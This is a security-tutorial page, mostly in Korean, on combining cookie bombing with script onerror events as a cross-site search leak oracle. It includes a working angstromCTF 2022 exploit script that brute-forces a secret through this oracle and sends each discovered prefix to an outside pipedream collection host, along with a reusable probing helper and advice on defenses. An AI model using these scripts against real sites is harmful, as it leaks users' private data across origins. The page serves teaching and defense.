# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

이 기법은 다음을 결합합니다:
- Cookie bombing: 대상 오리진에 대해 피해자 브라우저에 많은/큰 쿠키를 채워 이후 요청이 서버/요청 한도(요청 헤더 크기, 리다이렉트 시 URL 크기 등)에 도달하도록 만듭니다.
- Error-event oracle: 교차 출처 엔드포인트를 <script> (또는 다른 하위 리소스)로 요청해 onload와 onerror로 상태를 구분합니다.

High level idea
- 테스트하려는 두 상태에 대해 동작이 다른 대상 엔드포인트를 찾습니다(예: 검색 “hit” vs “miss”).
- “hit” 경로가 무거운 리다이렉트 체인이나 긴 URL을 유발하고 “miss” 경로는 짧게 유지되도록 합니다. 많은 쿠키로 요청 헤더를 부풀려 오직 “hit” 경로만 HTTP 오류(예: 431/414/400)로 서버가 실패하게 만듭니다. 그 오류가 onerror 이벤트를 뒤집어 XS-Search의 오라클이 됩니다.

When does this work
- 피해자 브라우저가 대상에 쿠키를 전송하도록 만들 수 있어야 합니다(예: 쿠키가 SameSite=None이거나 popup window.open을 통해 퍼스트파티 컨텍스트에서 설정할 수 있는 경우).
- 공격자가 임의의 쿠키를 설정할 수 있는 앱 기능이 있거나(예: 제어 가능한 입력 이름/값을 Set-Cookie로 바꾸는 “save preference” 엔드포인트) 인증 후 리다이렉트가 공격자 제어 데이터를 URL에 포함하도록 만드는 기능이 있어야 합니다.
- 서버가 두 상태에 따라 다르게 반응하고, 헤더/URL이 부풀려졌을 때 한 상태가 한도를 초과해 오류 응답을 반환하여 onerror를 트리거해야 합니다.

Note on server errors used as the oracle
- 431 Request Header Fields Too Large는 쿠키로 인해 요청 헤더가 부풀려질 때 흔히 반환됩니다; 긴 요청 대상에는 414 URI Too Long이나 서버 특정 400이 반환될 수 있습니다. 이들 중 어느 것이든 하위 리소스 로드 실패를 초래하여 onerror를 발생시킵니다. [MDN documents 431 and typical causes like excessive cookies.]()

Practical example (angstromCTF 2022)
다음 스크립트(공개 writeup에서 발췌)는 공격자가 임의의 쿠키를 삽입할 수 있는 기능을 악용한 뒤, 교차 출처 검색 엔드포인트를 스크립트로 로드합니다. 쿼리가 맞으면 서버는 리다이렉트를 수행하고 쿠키 부하와 함께 서버 한도를 초과해 오류 상태를 반환하므로 script.onerror가 실행됩니다; 그렇지 않으면 아무 일도 일어나지 않습니다.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
왜 popup (window.open)?
- 최신 브라우저들은 점점 third-party cookies를 차단합니다. 대상에 대해 top-level window를 열면 cookies가 first‑party가 되어 대상의 Set-Cookie 응답이 유지됩니다. 이로 인해 third‑party cookie restrictions가 있어도 cookie-bomb 단계가 가능해집니다.

Generic probing helper
이미 target origin (first-party)에 많은 cookies를 설정할 방법이 있다면, 이 minimal oracle을 재사용하여 성공/실패가 다른 네트워크 결과(status/MIME/redirect)를 초래하는 모든 endpoint에 대해 사용할 수 있습니다:
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Tips to build the oracle
- Force the “positive” state to be heavier: 조건이 참일 때만 추가 redirect를 체인하거나, redirect URL이 제한 없는 사용자 입력을 반영하도록 만들어 추측한 prefix와 함께 길어지게 하세요.
- Inflate headers: 일관된 오류가 “heavy” 경로에서 관찰될 때까지 cookie bombing을 반복하세요. 서버는 일반적으로 헤더 크기에 상한을 두며, 많은 쿠키가 있을 때 더 빨리 실패합니다.
- Stabilize: 여러 병렬 cookie set 작업을 실행하고 반복적으로 프로브하여 타이밍 및 캐싱 잡음을 평균화하세요.

Related XS-Search tricks
- URL length based oracles (no cookies needed)는 매우 긴 요청 대상(request target)을 강제할 수 있을 때 결합하거나 대신 사용할 수 있습니다:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Defenses and hardening
- Make success/failure responses indistinguishable:
- 조건부 redirects나 상태 간 응답 크기의 큰 차이를 피하세요. 상태와 관계없이 동일한 상태 코드, 동일한 Content-Type, 유사한 본문 길이를 반환하세요.
- Block cross-site subresource probes:
- SameSite cookies: 민감한 쿠키는 SameSite=Lax 또는 Strict로 설정하여 <script src> 같은 서브리소스 요청에 쿠키가 전송되지 않게 하세요; 가능하면 인증 토큰에는 Strict를 권장합니다.
- Fetch Metadata: Resource Isolation Policy를 적용해 cross-site 서브리소스 로드를 거부하세요 (예: Sec-Fetch-Site != same-origin/same-site인 경우).
- Cross-Origin-Resource-Policy (CORP): cross-origin 서브리소스로 임베드될 의도가 없는 엔드포인트에는 CORP: same-origin(적어도 same-site)을 설정하세요.
- X-Content-Type-Options: nosniff와 올바른 Content-Type을 JSON/HTML 엔드포인트에 설정해 load-as-script 특이 동작을 피하세요.
- Reduce header/URL amplification:
- 설정되는 쿠키의 수/크기를 제한하세요; 임의 폼 필드를 Set-Cookie로 바꾸는 기능을 정제(sanitize)하세요.
- 리다이렉트에서 반사되는 데이터를 정규화하거나 잘라내세요; 공격자가 제어하는 긴 문자열을 Location URL에 포함하지 마세요.
- 서버 제한을 일관되게 유지하고 일관되게 실패하게 하세요(한 분기에서만 특별 오류 페이지를 반환하지 않도록).

Notes
- 이 클래스의 공격은 일반적으로 “Error Events” XS-Leaks로 널리 논의됩니다. cookie-bomb 단계는 서버 한 분기만 한계를 초과하도록 밀어 신뢰할 수 있는 boolean oracle을 만드는 편리한 방법일 뿐입니다.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
{{#include ../../banners/hacktricks-training.md}}
